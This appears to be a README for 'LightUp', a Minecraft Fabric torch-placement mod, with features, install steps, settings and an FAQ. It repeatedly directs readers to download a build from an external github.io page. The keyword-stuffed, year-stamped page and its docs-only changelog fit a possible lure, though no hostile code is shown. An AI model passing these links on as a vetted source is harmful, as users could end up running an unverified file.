# LightUp - Minecraft Mod Utility 2026

> **LightUp is a Minecraft Fabric mod that helps improve torch coverage, find unlit areas, and manage lighting work in both survival and creative worlds.**

[![Game Mod](https://img.shields.io/badge/Type-Minecraft%20Mod-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft%20Fabric-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/noahsqckedwards8769/lightup-minecraft-mod?style=flat-square)](https://github.com/noahsqckedwards8769/lightup-minecraft-mod)

---

<p align="center">
  <a href="https://noahsqckedwards8769.github.io/lightup-minecraft-mod/">
    <img src="https://img.shields.io/badge/Download-LightUp%20Mod-brightgreen?style=for-the-badge" alt="Download LightUp Mod">
  </a>
</p>

> **[Download LightUp Directly](https://noahsqckedwards8769.github.io/lightup-minecraft-mod/)**

---

[Download Latest Build](https://noahsqckedwards8769.github.io/lightup-minecraft-mod/)

---

## What LightUp Does

LightUp is a Fabric utility for handling torch placement and improving lighting coverage in Minecraft. It examines nearby terrain for dark sections, calculates the approximate torch requirement, and assists with placing lights throughout a user-defined area.

Its lighting checks follow a grid with placement points separated by 12 blocks. In survival, LightUp works with torches in the player's inventory; creative and operator modes can provide unlimited torch access. Once placement is complete, an additional scan can reveal dark areas that remain uncovered.

---

## Features at a Glance

- Detects dark locations and places torches automatically.
- Shows the expected torch usage, including a breakdown by stack.
- Evaluates lighting on a grid using 12-block spacing.
- Lets users select a scan radius from 8 to 128 blocks.
- Takes torches from the survival inventory when using survival mode.
- Enables unlimited torch access in creative and operator modes.
- Uses a placement pace designed to be friendly to servers.
- Runs a second check to find dark spots left after the first placement pass.

---

## Installation

1. Get the newest LightUp build from the download link above.
2. Make sure the Minecraft instance is running Fabric.
3. Copy the downloaded mod file into that instance's `mods` directory.
4. Launch Minecraft through the appropriate Fabric profile.
5. Enter a world, set the desired lighting radius and mode, then start a scan.

The location of `mods` varies by launcher and instance configuration. Select the directory associated with the Minecraft profile that contains your Fabric installation.

---

## Configuration

The main LightUp controls are summarized below:

| Option | Available values | Purpose |
|---|---:|---|
| Scan radius | 8-128 blocks | Determines the maximum distance covered by the lighting search. |
| Placement spacing | 12 blocks | Controls the interval between grid-based placement checks. |
| Inventory mode | Survival | Places torches supplied by the player's inventory. |
| Unlimited access | Creative or operator mode | Permits torch placement without consuming a survival inventory supply. |
| Follow-up scan | Enabled after placement | Searches again for dark areas that were not addressed initially. |

---

## Compatibility and Requirements

- **Game platform:** Minecraft Fabric
- **Play styles:** Survival mode, creative mode, and operator-supported unlimited mode
- **Lighting range:** Configurable from 8 to 128 blocks
- **Placement method:** Grid checks at 12-block intervals
- **Known limitation:** Results depend on the chosen radius, the number of available survival torches, and the areas identified during each scan.

Install a LightUp version that corresponds to the Minecraft and Fabric setup used by your instance. For any particular game release, consult the build information associated with that release to confirm compatibility.

---

## Changelog

### 2026

- Reorganized LightUp documentation around Fabric setup and lighting workflows.
- Added documentation for searches covering 8-128 blocks.
- Described survival, creative, and operator placement options.
- Documented torch stack previews and post-placement dark-area scans.

---

## Frequently Asked Questions

### What are the installation steps?

Download a LightUp build, move it into the `mods` directory of a Fabric Minecraft instance, and start Minecraft using that Fabric profile.

### Does survival mode draw from my torch inventory?

Yes. When running in survival mode, LightUp places torches that are available in the player's inventory.

### Is unlimited torch access available in creative?

Yes. Creative mode and supported operator modes can use unlimited torch access through the relevant placement options.

### What scan sizes are supported?

The scan radius can be set anywhere from 8 to 128 blocks.

### Which lighting settings can I adjust?

You can change the scan radius and placement mode. Placement checks themselves use a fixed 12-block grid interval.

### How are missed dark areas handled?

After placing torches, LightUp can scan the area again to identify dark spots that the first pass did not cover.

### Which folder contains the mod?

Put the mod file in the `mods` directory belonging to the Fabric Minecraft instance you plan to run. The precise path depends on your launcher.

### Is LightUp compatible with every Minecraft version?

Compatibility is determined by the LightUp build and the Minecraft Fabric environment. Choose a build made for the game configuration installed on your system.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
